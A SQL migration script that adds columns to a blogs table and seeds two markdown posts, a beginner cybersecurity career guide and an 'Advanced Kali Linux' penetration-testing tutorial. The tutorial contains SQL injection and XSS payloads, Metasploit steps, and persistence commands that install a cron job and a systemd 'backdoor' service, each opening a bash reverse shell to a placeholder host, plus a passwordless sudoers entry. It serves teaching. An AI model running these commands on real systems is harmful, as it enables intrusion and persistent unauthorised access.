-- First, let's add the missing description column if it doesn't exist
ALTER TABLE blogs ADD COLUMN IF NOT EXISTS description TEXT;

-- Add content column to existing blogs table
ALTER TABLE blogs ADD COLUMN IF NOT EXISTS content TEXT;

-- Update the comment for the content column
COMMENT ON COLUMN blogs.content IS 'Detailed blog post content with markdown formatting';
COMMENT ON COLUMN blogs.description IS 'Brief description of the blog post for card display';

-- Optional: Update existing sample data to include content
-- This will only work if you have existing rows
UPDATE blogs 
SET content = 'Blog post content coming soon...' 
WHERE content IS NULL;

-- If you want to insert sample data with content (run this after adding the column)
-- Note: Using dollar-quoted strings to handle complex markdown content

INSERT INTO blogs (title, description, content, image_url, category, created_at) VALUES
(
    'Getting Started with Cybersecurity',
    'A comprehensive guide to beginning your journey in cybersecurity.',
    $doc$# Getting Started with Cybersecurity

## Overview
Cybersecurity is one of the most in-demand fields today, with endless opportunities for growth and innovation. This guide will help you kickstart your journey.

## Why Cybersecurity?

- **Growing Demand**: The cybersecurity job market is projected to grow 31% by 2029
- **Lucrative Salaries**: Average salary ranges from $70,000 to $150,000+
- **Constant Learning**: Technology evolves daily, keeping you engaged
- **Impact**: You'll be protecting people and organizations from real threats

## Essential Skills to Develop

### Technical Skills

1. **Networking Fundamentals**
   - TCP/IP protocols
   - Network architecture
   - Wireshark analysis

2. **Operating Systems**
   - Linux (Kali, Ubuntu)
   - Windows security
   - macOS security

3. **Programming**
   ```python
   # Example: Simple port scanner
   import socket
   import sys
   
   def scan_port(target, port):
       try:
           sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           sock.settimeout(1)
           result = sock.connect_ex((target, port))
           sock.close()
           return result == 0
       except:
           return False
   ```

### Soft Skills

- **Problem-solving mindset**
- **Attention to detail**
- **Communication skills**
- **Ethical decision making**

## Learning Path

| Phase | Duration | Focus Areas |
|-------|----------|-------------|
| Foundation | 3-6 months | Networking, OS basics |
| Technical Skills | 6-12 months | Programming, tools |
| Specialization | 6-12 months | Choose your path |
| Advanced Topics | Ongoing | Stay updated |

## Recommended Resources

### Online Platforms
- **TryHackMe**: Beginner-friendly learning platform
- **HackTheBox**: Challenge-based learning
- **Coursera**: Academic courses
- **Udemy**: Practical courses

### Books to Read
1. *"The Web Application Hacker's Handbook"* by Dafydd Stuttard
2. *"Penetration Testing: A Hands-On Introduction"* by Georgia Weidman
3. *"Blue Team Field Manual"* by Ben Clark

### Tools to Master

![Security Tools](https://images.unsplash.com/photo-1563013544-824ae1b704d3?w=400&h=200&fit=crop&crop=center)

#### Essential Tools
- **Nmap**: Network scanning
- **Metasploit**: Exploitation framework
- **Burp Suite**: Web application testing
- **Wireshark**: Packet analysis
- **John the Ripper**: Password cracking

## Career Paths in Cybersecurity

### Offensive Security
- **Penetration Tester**
- **Ethical Hacker**
- **Red Team Specialist**

### Defensive Security
- **Security Analyst**
- **Incident Responder**
- **Blue Team Specialist**

### Governance & Risk
- **Security Auditor**
- **Compliance Officer**
- **Risk Manager**

## Getting Your First Job

### Build Your Portfolio

1. **Create a GitHub profile** with your projects
2. **Write blog posts** about your learning journey
3. **Participate in CTF competitions**
4. **Get certifications** (CompTIA Security+, CEH, OSCP)

### Networking

- Join cybersecurity communities
- Attend conferences and meetups
- Connect with professionals on LinkedIn
- Find a mentor in the field

## Conclusion

Cybersecurity is a challenging but rewarding field that offers endless opportunities for growth. Start with the fundamentals, practice regularly, and never stop learning.

> "The only truly secure system is one that is powered off, cast in a block of concrete and sealed in a lead-lined room with armed guards." - Gene Spafford

Remember: With great power comes great responsibility. Always use your skills ethically and legally.

## Next Steps

1. **Set up your learning environment**
2. **Start with basic networking concepts**
3. **Practice on legal platforms**
4. **Join the community**
5. **Never stop learning!**

Happy hacking! 🚀$doc$,
    'https://images.unsplash.com/photo-1550745165-9bc0b252726a?w=400&h=200&fit=crop&crop=center',
    'Cybersecurity',
    NOW()
),
(
    'Advanced Kali Linux Techniques',
    'Master the art of penetration testing with Kali Linux advanced tools and methodologies.',
    $doc$# Advanced Kali Linux Techniques

## Overview
Kali Linux is the premier distribution for penetration testing and security auditing. This guide covers advanced techniques for professional security testing.

## Advanced Reconnaissance

### Passive Information Gathering

#### DNS Enumeration
```bash
# DNS enumeration with fierce
dnsenum --enum google.com

# Subdomain discovery with subfinder
subfinder -d example.com -o subdomains.txt

# DNS zone transfer attempt
dig axfr @ns1.example.com example.com
```

#### OSINT Framework

- **Maltego**: Relationship mapping
- **theHarvester**: Email and domain harvesting
- **Recon-ng**: Comprehensive reconnaissance framework

### Active Scanning

#### Advanced Nmap Techniques

```bash
# Comprehensive port scan
nmap -sS -sV -sC -O -A -p- target.com

# Nmap scripting engine
nmap --script vuln target.com

# Custom scan with timing
nmap -T4 -p 21,22,23,53,80,110,143,443,993,995 target.com
```

## Exploitation Techniques

### Web Application Testing

#### SQL Injection Advanced

```sql
-- Time-based blind SQL injection
'; WAITFOR DELAY '00:00:05'--

-- Union-based injection
' UNION SELECT 1,username,password,4 FROM users--

-- Error-based injection
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

#### XSS Payloads

```javascript
// Reflected XSS
<script>alert('XSS')</script>

// Stored XSS with image tag
<img src=x onerror=alert('XSS')>

// DOM-based XSS
#<script>alert(document.domain)</script>
```

### Network Exploitation

#### Metasploit Advanced Usage

```bash
# Search for exploits
msfconsole
search type:exploit platform:linux

# Use specific exploit
use exploit/linux/http/apache_mod_cgi_bash_env_exec

# Set options
set RHOSTS target.com
set LHOST your-ip

# Run exploit
exploit
```

## Post-Exploitation

### Privilege Escalation

#### Linux Privilege Escalation

```bash
# Check SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check writable files
find / -writable -type f 2>/dev/null

# Check running services
ps aux | grep root

# Check kernel version
uname -a

# Search for kernel exploits
searchsploit linux kernel 4.15
```

#### Windows Privilege Escalation

```powershell
# Check user privileges
whoami /priv

# Check running services
sc query type= service state= running

# Check for unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\"

# Check for weak permissions
icacls "C:\\Program Files\\Software"
```

## Persistence Mechanisms

### Linux Persistence

```bash
# Create cron job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/your-ip/4444 0>&1'" | crontab -

# Add user to sudoers
echo "username ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Create systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/your-ip/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service
```

## Advanced Tools

### Custom Script Development

#### Python Port Scanner

```python
#!/usr/bin/env python3
import socket
import threading
from queue import Queue
import sys

target = sys.argv[1]
queue = Queue()
open_ports = []

def port_scan(port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    except:
        pass

def threader():
    while True:
        worker = queue.get()
        port_scan(worker)
        queue.task_done()

# Create threads
for x in range(100):
    t = threading.Thread(target=threader)
    t.daemon = True
    t.start()

# Put ports in queue
for port in range(1, 65536):
    queue.put(port)

queue.join()

print(f"Open ports: {sorted(open_ports)}")
```

## Reporting and Documentation

### Professional Report Structure

1. **Executive Summary**
   - Key findings
   - Risk assessment
   - Recommendations

2. **Technical Details**
   - Methodology
   - Tools used
   - Detailed findings

3. **Evidence**
   - Screenshots
   - Logs
   - Proof of concepts

4. **Remediation**
   - Step-by-step fixes
   - Priority levels
   - Timeline

## Legal and Ethical Considerations

### Rules of Engagement

- **Written authorization** required
- **Scope definition** clearly documented
- **Time constraints** respected
- **Data protection** protocols followed

### Reporting Requirements

- **Vulnerability disclosure** timeline
- **Responsible disclosure** practices
- **Legal compliance** (GDPR, HIPAA, etc.)

## Continuous Learning

### Stay Updated

- **Security blogs**: Krebs on Security, Threat Post
- **Research papers**: USENIX, IEEE Security & Privacy
- **Conferences**: DEF CON, Black Hat, RSA
- **Online communities**: Reddit r/netsec, Twitter security community

### Practice Environments

- **HackTheBox**: Challenge-based learning
- **TryHackMe**: Guided learning paths
- **VulnHub**: Local practice VMs
- **PentesterLab**: Web security focus

## Conclusion

Mastering Kali Linux and penetration testing requires continuous practice and learning. Always operate within legal boundaries and ethical guidelines.

> "With great power comes great responsibility." - Uncle Ben

Stay curious, stay ethical, and keep learning! 🐧$doc$,
    'https://images.unsplash.com/photo-1558618047-3c8c76ca7d13?w=400&h=200&fit=crop&crop=center',
    'Penetration Testing',
    NOW()
)
ON CONFLICT DO NOTHING;
